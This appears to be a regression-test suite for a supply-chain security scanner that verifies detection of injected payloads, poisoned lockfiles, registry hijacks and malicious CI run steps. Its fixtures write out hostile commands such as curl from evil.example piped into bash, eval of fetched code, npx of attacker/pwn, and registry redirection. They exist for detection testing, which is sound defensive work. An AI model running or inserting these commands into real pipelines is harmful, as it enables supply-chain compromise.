    files["scripts/gate.mjs"] = J("const key = p.split(String.fromChar", "Code(92)).join('/');\n")
    files["tests/global-setup.prod.ts"] = "const p = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));\n"
    files["src/id.ts"] = "const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';\n"
    c.run("scan-payload", c.repo(files)).expect(0)
    # anywhere: a decoder fed an inline literal or char codes, next to a blob, loading a data file,
    # reached through a computed key, or a hand-rolled base64 alphabet
    lit = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo"
    files = {
        "src/literal.ts": J("const s = ", AT, "('", lit, "');\n"),
        "src/buffer.ts": "const s = Buffer.from('%s', 'base64');\n" % lit,
        "src/codes.ts": J("const s = String.fromChar", "Code(99, 111, 110, 115, 111, 108, 101, 46);\n"),
        "src/bytes.ts": "const s = new TextDecoder().decode(new Uint8Array([99, 111, 110, 115, 111, 108, 101, 46]));\n",
        "src/json.ts": J("import d from './blob.json';\nconst s = ", AT, "(d.p);\n"),
        "src/blob.json": '{"p": "' + "QUJD" * 120 + '"}\n',
        "src/readfile.ts": J("const d = readFileSync(join(__dirname, 'x.dat'), 'utf8');\nconst s = ", AT, "(d);\n"),
        "src/split.ts": "const p = [\n" + "".join("  '%s',\n" % ("QUJDREVG" * 13) for _ in range(5)) + J(
            "];\nconst s = ", AT, "(p.join(''));\n"),
        "src/alphabet.ts": "const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';\n",
        "src/keyed.ts": J("const s = globalThis['", AT, "'](d);\n"),
    }
    res = c.run("scan-payload", c.repo(files), "--checks", "P4,P5,P5b").expect(1, has=["P5", "P5b"], lacks=["P4"])
    flagged = set(p for p, _l in res.at("P5"))
    assert flagged == set(p for p in files if p.endswith(".ts")), sorted(set(files) - flagged)
    assert res.at("P5b") == [("src/blob.json", 1)], res.at("P5b")


@case
def p5_allowlisted_executor_line_stops_driving_p5(c):
    # A JSDoc line that names eval as a value AND holds a `(` stays P4 (round 3 skips only bare,
    # call-free prose; see jsdoc_prose_value_form_is_not_p4), and the file legitimately decodes base64
    # elsewhere. Allowlisting the P4 line once is enough: it no longer counts as an executor for P5.
    prose = J(" *   4. most-common per-test slug (majority) among {e2e, mobile, unit, ", EV, "}.")
    body = "/**\n" + prose + "\n */\nexport function f(raw: string) {\n  return Buffer.from(raw, 'base64').toString();\n}\n"
    r = c.repo({"server/src/services/run.service.ts": body})
    res = c.run("scan-payload", r).expect(1, has=["P4", "P5"])
    assert sorted(res.at("P5")) == [("server/src/services/run.service.ts", 2), ("server/src/services/run.service.ts", 5)], \
        res.at("P5")
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P4", "server/src/services/run.service.ts", res.fp("P4"), "prose in a doc comment")))
    c.git(r, "add", "-A")
    res = c.run("scan-payload", r).expect(0)
    assert len(res.allowed) == 1
    # a real executor added later is not covered by that entry: P4 and P5 come back
    with open(os.path.join(r, "server/src/services/run.service.ts"), "a") as fh:
        fh.write(J("export const g = (s: string) => (0, ", EV, ")(s);\n"))
    c.run("scan-payload", r).expect(1, has=["P4", "P5"])


@case
def p5b_escape_and_split_blobs(c):
    esc = "'" + "".join("\\x%02x" % (0x41 + i % 26) for i in range(40)) + "'"
    c.run("scan-payload", c.repo({"src/a.js": "const s = " + esc + ";\n"})).expect(1, has=["P5b"])
    chunks = "".join("  '%s',\n" % ("QUJDREVG" * 45) for _ in range(6))
    res = c.run("scan-payload", c.repo({"src/a.js": "const p = [\n" + chunks + "];\n"})).expect(1, has=["P5b"])
    assert len(res.at("P5b")) == 6, res.at("P5b")
    # a few hashes or a short key are not a blob
    c.run("scan-payload", c.repo({"src/a.test.ts": "".join("expect(h).toBe('%s');\n" % ("ab12" * 16) for _ in range(3))})
          ).expect(0)
    c.run("scan-payload", c.repo({"docs/api.json": '{"d": "' + "QUJD" * 120 + '"}\n'})).expect(1, has=["P5b"])


# (5) yarn / bun / deno lockfiles
YARN_V1 = ("# yarn lockfile v1\n\n\n\"left-pad@^1.0.0\", \"left-pad@^1.3.0\":\n  version \"1.3.0\"\n"
           "  resolved \"https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#5b8a3a7765dfe001261dde915589e782f8c94d1e\"\n"
           "  integrity %s\n\n\"@s/x@^2.0.0\":\n  version \"2.0.0\"\n"
           "  resolved \"https://registry.npmjs.org/@s/x/-/x-2.0.0.tgz#abc\"\n  integrity %s\n  dependencies:\n"
           "    left-pad \"^1.0.0\"\n" % (INTEG, INTEG))
YARN_BERRY = ("__metadata:\n  version: 8\n  cacheKey: 10c0\n\n\"app@workspace:.\":\n  version: 0.0.0-use.local\n"
              "  resolution: \"app@workspace:.\"\n  languageName: unknown\n  linkType: soft\n\n"
              "\"lodash@npm:^4.17.21\":\n  version: 4.17.21\n  resolution: \"lodash@npm:4.17.21\"\n"
              "  checksum: 10c0/%s\n  languageName: node\n  linkType: hard\n" % ("ab" * 64))
BUN_LOCK = ('{\n  "lockfileVersion": 1,\n  "workspaces": {\n    "": { "name": "app", "dependencies": { "ms": "^2.1.3" } },\n'
            '  },\n  "packages": {\n    "ms": ["ms@2.1.3", "", {}, "%s"],\n  }\n}\n' % INTEG)
DENO_LOCK = json.dumps({"version": "4", "specifiers": {"npm:ms@2": "2.1.3"},
                        "jsr": {"@std/path@1.0.8": {"integrity": "ab" * 32}},
                        "npm": {"ms@2.1.3": {"integrity": INTEG}},
                        "remote": {"https://deno.land/std@0.224.0/path/mod.ts": "cd" * 32}}, indent=2) + "\n"


@case
def supply_yarn_bun_deno_lockfiles(c):
    good = {".yarnrc.yml": "enableScripts: false\n", "g1/yarn.lock": YARN_V1, "g2/yarn.lock": YARN_BERRY,
            "g3/bun.lock": BUN_LOCK, "g4/deno.lock": DENO_LOCK}
    c.run("supply-chain-check", c.repo(good)).expect(0)
    c.run("supply-chain-check", c.repo({"yarn.lock": YARN_V1, ".yarnrc": "ignore-scripts true\n"})).expect(0)
    c.run("supply-chain-check", c.repo({"yarn.lock": YARN_V1})).expect(1, has=["S4"], lacks=["S1"])
    lp = "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz"
    bad = [("yarn.lock", YARN_V1.replace(lp, "https://evil.example/lp.tgz")),
           ("yarn.lock", YARN_V1.replace(lp + "#5b8a3a7765dfe001261dde915589e782f8c94d1e",
                                         "https://codeload.github.com/o/r/tar.gz/abc")),
           ("yarn.lock", YARN_V1.replace("  integrity %s\n\n\"@s" % INTEG, "\n\"@s")),
           ("yarn.lock", YARN_V1.replace("https://registry.npmjs.org/@s/x/-/x-2.0.0.tgz#abc", "git+https://github.com/o/x.git#abc")),
           ("yarn.lock", YARN_V1 + "\n\"loc@file:../../../outside\":\n  version \"1.0.0\"\n"),
           ("yarn.lock", YARN_V1 + "\n\"nores@^1.0.0\":\n  version \"1.0.0\"\n"),
           ("yarn.lock", YARN_BERRY.replace("lodash@npm:4.17.21\"", "lodash@https://evil.example/l.tgz\"")),
           ("yarn.lock", YARN_BERRY.replace("  checksum: 10c0/%s\n" % ("ab" * 64), "")),
           ("yarn.lock", YARN_BERRY.replace("lodash@npm:4.17.21\"", "lodash@git+https://github.com/o/l.git#commit=abc\"")),
           ("bun.lock", BUN_LOCK.replace('"ms@2.1.3", ""', '"ms@2.1.3", "https://evil.example/"')),
           ("bun.lock", BUN_LOCK.replace('"ms@2.1.3", "", {}, "%s"' % INTEG, '"ms@github:o/ms#abc", {}, "o-ms-abc"')),
           ("bun.lock", BUN_LOCK.replace(', "%s"]' % INTEG, "]")),
           ("bun.lock", BUN_LOCK.replace('"ms@2.1.3", "", {}, "%s"' % INTEG, '"ms@https://evil.example/ms.tgz", {}')),
           ("bun.lock", "{ not json"),
           ("bun.lockb", b"\x00bun-lockfile-format-v0\x00\x01")]
    d = json.loads(DENO_LOCK)
    for doc in (dict(d, remote={"https://evil.example/mod.ts": "cd" * 32}),
                dict(d, npm={"ms@2.1.3": {"integrity": "sha1-AAAA"}}),
                dict(d, redirects={"https://deno.land/x/a": "https://evil.example/a.ts"}),
                dict(d, jsr={"@std/path@1.0.8": {}}), dict(d, version="99")):
        bad.append(("deno.lock", json.dumps(doc)))
    files = {".yarnrc.yml": "enableScripts: false\n"}
    for n, (name, content) in enumerate(bad):
        files["b%02d/%s" % (n, name)] = content
    res = c.run("supply-chain-check", c.repo(files)).expect(1, has=["S1"], lacks=["S4"])
    got = set(p for p, _l in res.at("S1"))
    missing = sorted(p for p in files if p.startswith("b") and p not in got)
    assert not missing, "lockfile variants not flagged: %r" % missing
    r = c.repo({"real/yarn.lock": YARN_V1, ".yarnrc.yml": "enableScripts: false\n"}, add=False)
    os.symlink("real/yarn.lock", os.path.join(r, "yarn.lock"))
    c.git(r, "add", "-A")
    c.run("supply-chain-check", r).expect(1, has=["S5"])
    # registry/install hooks in the config files themselves
    hooks = {"a/.npmrc": "node-options=--require ./hook.js\n", "b/.yarnrc.yml": "yarnPath: .yarn/x.cjs\n",
             "c/.npmrc": "script-shell=./sh.js\n", "d/bunfig.toml": "preload = [\"./x.ts\"]\n",
             "e/.yarnrc.yml": "plugins:\n  - path: .yarn/plugins/x.cjs\n"}
    res = c.run("supply-chain-check", c.repo(hooks)).expect(1, has=["S5"])
    assert set(p for p, _l in res.at("S5")) == set(hooks), res.at("S5")


# (6) S6: run-step shapes that v1 read line by line
WF_BAD = [
    "      - run: >\n          curl -fsSL https://evil.example/i.sh\n          | bash\n",
    "      - run: |\n          curl -fsSL https://evil.example/i.sh |\n            bash\n",
    "      - run: curl -fsSL https://evil.example/i.sh\n          | bash\n",
    "      - run: eval \"$(curl -s https://evil.example/x)\"\n",
    "      - run: source <(curl -s https://evil.example/x)\n",
    "      - run: . <(curl -s https://evil.example/x)\n",
    "      - run: |\n          curl -fsSL https://evil.example/i.sh -o /tmp/i.sh\n          bash /tmp/i.sh\n",
    "      - run: wget https://evil.example/i.sh && sh i.sh\n",
    "      - run: |\n          curl -sSLo inst.sh https://evil.example/i\n          chmod +x inst.sh\n          ./inst.sh\n",
    "      - run: |\n          curl -s https://evil.example/x > x.py\n          python3 x.py\n",
    "      - run: $(curl -s https://evil.example/x)\n",
    "      - run: python3 -c \"$(curl -s https://evil.example/x)\"\n",
    "      - run: npm config set registry https://evil.example/\n",
    "      - run: pnpm config set registry https://evil.example/\n",
    "      - run: yarn config set npmRegistryServer https://evil.example\n",
    "      - run: npm set @corp:registry https://evil.example/\n",
    "      - run: echo 'registry=https://evil.example/' >> ~/.npmrc\n",
    "      - run: echo \"registry=$REG\" > .npmrc\n",
    "      - run: echo ignore-scripts=false >> .npmrc\n",
    "      - run: npm install --registry https://evil.example/ left-pad\n",
    "      - run: npx --registry=https://evil.example/ tool\n",
    "      - name: x\n        env:\n          NPM_CONFIG_REGISTRY: https://evil.example/\n        run: npm ci\n",
    "      - run: |\n          export npm_config_registry=https://evil.example/\n          npm ci\n",
    "      - name: x\n        env:\n          NODE_OPTIONS: --require ./x.js\n        run: npm test\n",
    "      - run: npx github:attacker/pwn\n",
    "      - run: npx --yes attacker/pwn\n",
    "      - run: npm i -g git+https://github.com/attacker/pwn.git\n",
    "      - run: pnpm dlx https://evil.example/x.tgz\n",
    "      - run: yarn add github:attacker/pwn\n",
    "      - run: npx -p github:attacker/pwn cmd\n",
]
WF_OK = ("      - run: |\n          curl -fsSL -m 30 https://testrelic.ai/install.sh -o \"$TMP/served.sh\" 2>/dev/null || true\n"
         "          sed -n '/x/p' \"$TMP/served.sh\" | grep -oE 'https://[^,]+'\n"
         "      - run: STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" https://x.example/health)\n"
         "      - run: npm publish --registry https://npm.pkg.github.com\n"
         "      - uses: actions/setup-node@" + SHA40 + "\n        with:\n          registry-url: https://npm.pkg.github.com\n"
         "      - run: echo \"//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\" > ~/.npmrc\n"
         "      - run: npx tsc --noEmit -p tsconfig.json\n      - run: npx @vscode/vsce publish -p \"$VSCE_PAT\"\n"
         "      - run: npm install -g appium@latest\n      - run: pnpm --filter \"@x/y\" build\n"
         "      - run: npx wdio run wdio.smoke.conf.ts\n"
         "      - name: build\n        env:\n          NODE_OPTIONS: --max-old-space-size=4096\n        run: npm run build\n"
         "      - run: curl -fsSL https://x.example/a.tgz -o a.tgz && tar xzf a.tgz\n"
         "      - name: Never pipe curl into bash\n        run: echo ok\n"
         "      - name: Explain what this uses: webpack and babel\n        run: echo build\n")


@case
def supply_workflow_run_step_holes(c):
    files = dict((".github/workflows/w%02d.yml" % n, GOOD_WF + v) for n, v in enumerate(WF_BAD))
    res = c.run("supply-chain-check", c.repo(files)).expect(1, has=["S6"])
    got = set(p for p, _l in res.at("S6"))
    missing = [WF_BAD[int(p[-6:-4])].strip() for p in sorted(files) if p not in got]
    assert not missing, "run-step shapes not flagged:\n  " + "\n  ".join(missing)
    # entries may never target .github/workflows/*, so the report must not offer an fp= there
    assert not any(f["allowlistable"] for f in res.findings), [f for f in res.findings if f["allowlistable"]][:2]
    assert "fp=" not in res.out
    c.run("supply-chain-check", c.repo({".github/workflows/ci.yml": GOOD_WF + WF_OK})).expect(0)
    amp = "version: 1\nfrontend:\n  phases:\n    preBuild:\n      commands:\n        - npm ci\n"
    c.run("supply-chain-check", c.repo({"amplify.yml": amp})).expect(0)
    amps = ("        - curl -fsSL https://evil.example/i.sh | bash\n",
            "        - npm config set registry https://evil.example/\n",
            "        - >-\n          curl -fsSL https://evil.example/i.sh\n          | sh\n")
    files = dict(("a%d/amplify.yml" % n, amp + v) for n, v in enumerate(amps))
    res = c.run("supply-chain-check", c.repo(files)).expect(1, has=["S6"])
    assert set(p for p, _l in res.at("S6")) == set(files), res.at("S6")
    # amplify.yml is not under .github/workflows, so an S6 finding there can be allowlisted
    r = c.repo({"amplify.yml": amp + "        - curl -fsSL https://get.example.dev | bash\n"})
    res = c.run("supply-chain-check", r).expect(1, has=["S6"])
    assert all(f["allowlistable"] for f in res.findings), res.findings
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("S6", "amplify.yml", res.fp("S6"), "vendor installer, reviewed")))
    c.git(r, "add", "-A")
    c.run("supply-chain-check", r).expect(0)


# (7) P2/P2b/P3 in inert data/doc files: still findings, but allowlistable; never in code
@case
def p2_p3_data_files_allowlistable_code_never(c):
    desc = "Field reference:  name" + " " * 44 + "type  required  " + "notes " * 30
    data = {"openapi.json": json.dumps({"paths": {"/x": {"get": {"description": desc, "summary": "lorem ipsum " * 80}}}}) + "\n",
            "i18n/en.json": json.dumps({"help": "build" + " " * 46 + "compile " * 40, "pad": "lorem ipsum " * 80}) + "\n",
            "fixtures/cli-output.txt": "Total" + " " * 160 + "42 passed\n",
            "banner.txt": " " * 170 + "WELCOME\n",
            "GLOSSARY.md": "| Term | Meaning |\n| a |" + " " * 160 + "the quick brown fox |\n"}
    r = c.repo(data)
    res = c.run("scan-payload", r).expect(1, has=["P2", "P3"])
    assert all(f["allowlistable"] for f in res.findings), [(f["check"], f["path"]) for f in res.findings]
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(*[(f["check"], f["path"], f["fingerprint"], "aligned text, reviewed") for f in res.findings]))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(0)
    code = {"src/a.js": "x();" + " " * 160 + "y();\n", "scripts/t.sh": 'printf "%s" "NAME' + " " * 44 + 'S"' + "x" * 1100 + "\n",
            "package.json": '{"name": "x",' + " " * 160 + '"version": "1.0.0"}\n',
            ".vscode/tasks.json": '{"a": 1,' + " " * 160 + '"b": 2}\n',
            "docs/page.mdx": "# t\n" + "x" + " " * 160 + "{y}\n"}
    r = c.repo(code)
    res = c.run("scan-payload", r).expect(1, has=["P2", "P3"])
    assert not any(f["allowlistable"] for f in res.findings if f["check"] in ("P2", "P3")), res.findings
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(*[(f["check"], f["path"], f["fingerprint"], "attempt") for f in res.findings
                         if f["check"] in ("P2", "P3")]))
    c.git(r, "add", "-A")
    res = c.run("scan-payload", r).expect(1, has=["P2", "P3", "AL"])
    assert any("cannot be allowlisted in code" in f["message"] for f in res.findings if f["check"] == "AL"), res.out[-800:]


# ---------------------------------------------------------------------------
# round 3 regressions
# ---------------------------------------------------------------------------
# (1) core FP: the legacy scanner trips P1 on every head that carries it. No exemption; the
#     adoption change (tools/adoption-patch) deletes it and repoints its steps.
SCAN_CMD = "bash .supply-chain-guard/bin/scan-payload && bash .supply-chain-guard/bin/supply-chain-check"
SELFTEST_CMD = "bash .supply-chain-guard/bin/self-test"
LEGACY = "scripts/scan-injected-" + "payload.sh"
LEGACY_TEST = "scripts/scan-injected-" + "payload.test.sh"
MCP_LEGACY = "scripts/supply-chain-" + "scan.sh"
CHECKOUT = "actions/checkout@%s # v4" % SHA40
SEC_SCAN_WF = ("name: Security - Injected Payload Scan\n\n# Runs on every branch. Same script as amplify.yml (see %s).\n"
               "on:\n  push:\n    branches: ['**']\n  pull_request:\npermissions:\n  contents: read\njobs:\n  scan:\n"
               "    name: Scan for injected payloads\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n"
               "        uses: %s\n        with:\n          persist-credentials: false\n\n"
               "      # The scanner's own tests run FIRST.\n      - name: Self-test the scanner\n        run: bash %s\n\n"
               "      - name: Scan the tree\n        run: bash %s\n" % (LEGACY, CHECKOUT, LEGACY_TEST, LEGACY))
RELEASE_WF = ("name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  scan:\n"
              "    runs-on: ubuntu-latest\n    steps:\n      - uses: %s\n        with:\n          persist-credentials: false\n"
              "      - name: Self-test the scanner\n        run: bash %s\n      - name: Scan the tree\n        run: bash %s\n"
              "  build:\n    needs: scan\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n"
              "          # failing open is the flaw the scanner was rebuilt to remove (note 1 in\n"
              "          # %s); this gate now fails closed.\n          echo build\n"
              % (CHECKOUT, LEGACY_TEST, LEGACY, LEGACY))
GATE_WF = ("name: Security Gate\n# Two checks:\n#   1. supply-chain  -- scan the tree for implant shape (see %s)\non:\n"
           "  pull_request:\npermissions:\n  contents: read\njobs:\n  supply-chain:\n    runs-on: ubuntu-latest\n"
           "    steps:\n      - name: Checkout\n        uses: %s\n        with:\n          persist-credentials: false\n\n"
           "      - name: Scan tracked source for implant shape\n        run: bash %s\n" % (MCP_LEGACY, CHECKOUT, MCP_LEGACY))
AMPLIFY = ("version: 1\nfrontend:\n  phases:\n    preBuild:\n      commands:\n"
           "        # Refuse to build a poisoned tree (same script as the GitHub check).\n"
           "        - bash %s\n        - npm ci\n    build:\n      commands:\n        - npm run build\n" % LEGACY)


def _corpus_shaped_consumer(c):
    """The clean heads' shape: the legacy grep literal at line 114, its self-test and .allow, the
    steps that run them (security-scan.yml, a release job others `needs:`, amplify preBuild, an npm
    script, the mcp-server gate) and mentions in comments and docs."""
    scanner = "#!/usr/bin/env bash\nset -eu\n" + "# note\n" * 110 + "hits=$(git grep -n -I \\\n" + LEGACY_LINE + ")\n"
    files = {LEGACY: scanner, LEGACY_TEST: LEGACY_TEST_SH, "scripts/scan-injected-" + "payload.allow": "# none\n",
             MCP_LEGACY: "#!/usr/bin/env bash\nset -eu\ngit ls-files -z | head -c 0\n",
             ".github/workflows/security-scan.yml": SEC_SCAN_WF, ".github/workflows/release.yml": RELEASE_WF,
             ".github/workflows/security-gate.yml": GATE_WF, "amplify.yml": AMPLIFY,
             "package.json": '{\n  "name": "x",\n  "private": true,\n  "scripts": {\n    "scan": "bash %s && echo ok",\n'
                             '    "build": "tsc"\n  }\n}\n' % LEGACY,
             "src/lib/decisions.ts": "// scan-injected-" + "payload.sh), which treats any dynamic-execution "
                                                   "construct as a\nexport const x = 1;\n",
             "specs/026/quickstart.md": "bash %s && bash %s\n" % (LEGACY_TEST, LEGACY)}
    return c.repo(files, commit=True)


@case
def rollout_adoption_patch_clears_the_legacy_p1(c):
    r = _corpus_shaped_consumer(c)
    res = c.run("scan-payload", r).expect(1, has=["P1"])
    assert [(f["path"], f["line"], f["allowlistable"]) for f in res.findings] == [(LEGACY, 114, False)], res.findings
    head = c.git(r, "rev-parse", "HEAD")
    pp = c.path("adoption.patch")
    jp = c.path("adoption.json")
    rc, out = c.run_raw("tools/adoption-patch", "--repo-dir", r, "--patch", pp, "--json", jp)
    assert rc == 0 and "adoption-patch verdict: READY" in out and "P1 after the change: 0" in out, out[-2500:]
    with open(jp) as fh:
        doc = json.load(fh)[0]
    assert sorted(doc["deleted"]) == sorted([LEGACY, LEGACY_TEST, "scripts/scan-injected-" + "payload.allow", MCP_LEGACY]), \
        doc["deleted"]
    got = sorted((x["path"], x["line"], x["new"]) for x in doc["rewritten"])
    assert got == sorted([(".github/workflows/security-scan.yml", 22, SELFTEST_CMD),
                          (".github/workflows/security-scan.yml", 25, SCAN_CMD),
                          (".github/workflows/release.yml", 15, SELFTEST_CMD),
                          (".github/workflows/release.yml", 17, SCAN_CMD),
                          (".github/workflows/security-gate.yml", 18, SCAN_CMD),
                          ("amplify.yml", 7, SCAN_CMD), ("package.json", 5, SCAN_CMD)]), got
    assert doc["manual"] == [] and doc["suspicious"] == [] and doc["mentions"] == 5, (doc["manual"], doc["mentions"])
    # the steps stay (names, jobs, needs:); only the command changed; comments are untouched
    with open(os.path.join(r, ".github/workflows/release.yml")) as fh:
        wf = fh.read()
    assert wf == RELEASE_WF.replace("bash " + LEGACY_TEST, SELFTEST_CMD).replace("run: bash " + LEGACY + "\n", "run: " + SCAN_CMD + "\n"), wf
    with open(os.path.join(r, "amplify.yml")) as fh:
        assert fh.read() == AMPLIFY.replace("bash " + LEGACY, SCAN_CMD)
    with open(os.path.join(r, "package.json")) as fh:
        assert json.load(fh)["scripts"]["scan"] == SCAN_CMD + " && echo ok"
    for f in doc["deleted"]:
        assert not os.path.exists(os.path.join(r, f)), f
    assert os.path.isfile(os.path.join(r, ".supply-chain-guard", "bin", "scan-payload"))
    # the repointed self-test step works from the vendored copy (canaries only: seconds)
    p = subprocess.run(["bash", ".supply-chain-guard/bin/self-test"], cwd=r, env=c.env, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, timeout=600)
    assert p.returncode == 0 and b"self-test: ok" in p.stdout, p.stdout[-800:]
    staged = c.git(r, "diff", "--cached", "--name-status")
    assert "D\t" + LEGACY in staged and "A\t.supply-chain-guard/lib/guard/payload.py" in staged, staged
    # the changed tree passes every check, P8 included (the vendored copy is byte-identical)
    c.run("scan-payload", r).expect(0)
    c.run("supply-chain-check", r).expect(0)
    # the patch is a plain `git apply` patch for the adoption PR
    clone = c.path("clone")
    c.git(r, "clone", "-q", r, clone)
    c.git(clone, "checkout", "-q", head)
    c.git(clone, "apply", "--index", pp)
    c.run("scan-payload", clone).expect(0)
    c.run("supply-chain-check", clone).expect(0)
    # a dirty tree is refused, nothing is half-written
    with open(os.path.join(clone, "amplify.yml"), "a") as fh:
        fh.write("# local edit\n")
    rc, out = c.run_raw("tools/adoption-patch", "--repo-dir", clone)
    assert rc == 2 and "uncommitted changes" in out, out[-600:]


@case
def self_test_runs_every_canary_and_fails_closed(c):
    rc, out = c.run_raw("bin/self-test")
    assert rc == 0 and "self-test: ok" in out, out[-800:]
    for tool in ("scan-payload", "supply-chain-check", "commit-provenance"):
        assert "self-test: %s canary ok" % tool in out, out[-800:]
    for chk in ("P1", "P4", "S6", "C3"):
        rc, out = c.run_raw("bin/self-test", env={"GUARD_SELFTEST_SABOTAGE": chk})
        assert rc == 2 and "canary FAILED" in out and "COULD NOT SCAN" in out, (chk, out[-800:])


@case
def rollout_adoption_patch_leaves_what_it_cannot_rewrite(c):
    files = {LEGACY: LEGACY_SH,
             ".github/workflows/a.yml": GOOD_WF + "      - run: bash %s --staged\n" % LEGACY,
             ".github/workflows/b.yml": GOOD_WF + "      - run: bash %s | tee scan.log\n" % LEGACY,
             ".github/workflows/c.yml": GOOD_WF.replace("  pull_request:\n", "  pull_request:\n    paths: ['%s']\n" % LEGACY),
             "tools/run.ts": "execSync('bash %s');\n" % LEGACY,
             "Makefile": "scan:\n\tbash ./%s\n" % LEGACY}
    r = c.repo(files, commit=True)
    jp = c.path("p.json")
    rc, out = c.run_raw("tools/adoption-patch", "--repo-dir", r, "--json", jp)
    assert rc == 1 and "needs a human" in out, out[-2000:]
    with open(jp) as fh:
        doc = json.load(fh)[0]
    assert sorted(x["path"] for x in doc["manual"]) == [".github/workflows/a.yml", ".github/workflows/b.yml",
                                                        ".github/workflows/c.yml", "tools/run.ts"], doc["manual"]
    assert [(x["path"], x["new"]) for x in doc["rewritten"]] == [("Makefile", SCAN_CMD)], doc["rewritten"]
    for p in (".github/workflows/a.yml", ".github/workflows/b.yml", ".github/workflows/c.yml", "tools/run.ts"):
        with open(os.path.join(r, p)) as fh:
            assert fh.read() == files[p], p


@case
def rollout_legacy_named_file_with_a_payload_is_not_legacy(c):
    # no filename exemption, and no "legacy scanner" excuse for a real signature under that name
    payload_line = J(GLOBAL_O("5-864-du"), ";")
    body = LEGACY_SH + payload_line + "\n"
    r = c.repo({LEGACY: body, "vendor/x/scan-injected-" + "payload.sh": J("var ", ID("f999"), "=0;\n")}, commit=True)
    res = c.run("scan-payload", r).expect(1, has=["P1"])
    p1 = sorted((f["path"], f["line"], f["message"]) for f in res.findings if f["check"] == "P1")
    assert [(p, l) for p, l, _m in p1] == [(LEGACY, 4), (LEGACY, 5), ("vendor/x/scan-injected-" + "payload.sh", 1)], p1
    assert "legacy in-repo scanner" in p1[0][2], p1[0]
    assert "legacy" not in p1[1][2] and "legacy" not in p1[2][2], p1
    jp = c.path("pre.json")
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r, "--json", jp)
    with open(jp) as fh:
        doc = json.load(fh)[0]
    assert rc == 1 and "SUSPICIOUS" in out, out[-1500:]
    assert doc["suspicious_legacy_files"] == sorted([LEGACY, "vendor/x/scan-injected-" + "payload.sh"]), doc
    assert sorted((d["path"], d["line"]) for d in doc["must_fix"]) == [(LEGACY, 5), ("vendor/x/scan-injected-" + "payload.sh", 1)]
    rc, out = c.run_raw("tools/adoption-patch", "--repo-dir", r)
    assert rc == 1 and "SUSPICIOUS, kept for a human" in out, out[-1500:]
    assert os.path.exists(os.path.join(r, LEGACY)) and os.path.exists(os.path.join(r, "vendor/x/scan-injected-" + "payload.sh"))


# (2) value-form rules 17/18 on JSDoc prose (a real service file and its test)
RUN_SERVICE_DOC = ("/**\n * Derive the run-level `test_type` slug (e2e / api / mobile / unit / " + EV + ") and\n"
                   " * the dominant API protocol from the upload body. Priority:\n"
                   " *   1. all-API -> 'api' (via explicit/metadata 'api', any apiProtocol, or a\n"
                   " *      per-test 'api' slug majority), evaluated first.\n"
                   " *   2. explicit top-level `testType` slug from the SDK (capture-level detection).\n"
                   " *   3. `metadata.testType`.\n"
                   " *   4. most-common per-test slug among {e2e, mobile, unit, " + EV + "}.\n"
                   " *   5. framework default for single-purpose frameworks.\n"
                   " * Returns null for runs whose type cannot be detected (rendered as \"-\").\n */\n")


@case
def jsdoc_prose_value_form_is_not_p4(c):
    decoder = ("export function parseCursor(raw: string) {\n"
               "  const parsed = JSON.parse(Buffer.from(raw, 'base64url').toString('utf8')) as { t?: string };\n"
               "  return parsed;\n}\n")
    test_doc = ("import { describe } from 'vitest';\n\n/**\n * Priority (highest first):\n *   3. metadata.testType.\n"
                " *   4. most-common per-test slug among {e2e, mobile, unit, " + EV + "}.\n"
                " *   5. framework default.\n */\ndescribe('x', () => {});\n")
    fn_doc = "/**\n * Kinds: {Arrow, " + FN + "}\n * Done.\n */\nexport const k = 1;\n"
    clean = {"server/src/services/run.service.ts": "export const a = 1;\n\n" + RUN_SERVICE_DOC + decoder,
             "server/tests/unit/derive-protocol-signal.test.ts": test_doc, "src/kinds.js": fn_doc}
    c.run("scan-payload", c.repo(clean)).expect(0, lacks=["P4", "P5"])
    # the same words are still P4 wherever the line could be code, calls, assigns or picks
    traps = {
        "t1.ts": "const o = 1\n * {r: " + EV + "}\n * 2;\n",                       # line above is code
        "t2.ts": "/**\n * (0, " + EV + ")(s)\n */\n",                             # calls
        "t3.ts": "/**\n * x = " + EV + ";\n */\n",                                # assigns
        "t4.ts": "/**\n * c ? [" + EV + "][0] : 0\n */\n",                        # ternary pick
        "t5.ts": "/**\n * {a, " + EV + "}\n(s);\n",                               # next line calls
        "t6.ts": "/**\n * `${[" + EV + "][0]}`\n */\n",                           # template
        "t7.ts": "/* a */\n * {r: " + EV + "}\n * 2;\n",                          # comment closed above
        "t8.ts": "const F = 1\n * [" + FN + "]\n * 2;\n",                         # rule 18, under code
        "t9.ts": "/**\n * {a, " + EV + "}",                                       # no next line
        "t10.jsx": "/**\n * {a, " + EV + "} 'x'\n */\n",                           # quote on the line
    }
    res = c.run("scan-payload", c.repo(traps), "--checks", "P4").expect(1, has=["P4"])
    want = {"t1.ts": 2, "t2.ts": 2, "t3.ts": 2, "t4.ts": 2, "t5.ts": 2, "t6.ts": 2, "t7.ts": 2, "t8.ts": 2, "t9.ts": 2,
            "t10.jsx": 2}
    assert sorted(res.at("P4")) == sorted(want.items()), sorted(res.at("P4"))
    # the skip is for the value forms only: an eval( call on a JSDoc line is still P4, and so is P5
    r = c.repo({"scripts/gen.ts": "/**\n * " + EV + "(s)\n */\nconst s = Buffer.from(d, 'base64').toString();\n"})
    res = c.run("scan-payload", r).expect(1, has=["P4", "P5"])
